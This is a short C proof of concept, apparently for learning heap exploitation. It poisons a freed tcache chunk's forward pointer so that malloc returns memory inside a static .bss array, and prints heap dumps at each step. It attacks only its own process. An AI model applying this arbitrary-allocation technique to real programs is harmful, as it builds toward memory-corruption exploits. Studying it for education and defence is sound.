#include <stdlib.h>
#include <string.h>
#include <stdio.h>


//where I will allocate for fastbin attack (.bss)
static long long data[8];

void print_qword(void* data, int n64){
	int i;
	for(i = 0; i < n64-2; i += 2)
		printf("%p: 0x%016llx\t0x%016llx\n", (long long*)data + i, *(((long long*)data) + i), *(((long long*)data) + i+1));
	if(n64 % 2 != 0)
		printf("%p: 0x%016llx\n", (long long*)data + i, *(((long long*)data) + i));
}

int main(){
	//initializing data
	memset(data, 0xffffffff, sizeof(data));
	
	int i = 0;
	char* big = (char*)malloc(0x600);
	char* small = (char*)malloc(0x50); //no coalascing
	for(i; i<0x600; i++)
		big[i] = 0xff;
	free(big);
	
	void* tcache = malloc(0x30);
	printf("ALLOC @ %p\n", tcache - 0x10);
	print_qword(tcache - 0x10, 9);
	
	free(tcache);
	printf("FREE @ %p\n", tcache - 0x10);
	print_qword(tcache - 0x10, 9);
	
	*((long long*)tcache) = (long long)data + 0x10;
	tcache = malloc(0x30); //first
	void* tcache2 = malloc(0x30); //second (tcache2 should point to data)
	printf("&data: %p, FASTBIN ATTACK ALLOC @ %p\n", data, tcache2);
	print_qword(tcache2 - 0x10, 9);
	return 0;
}
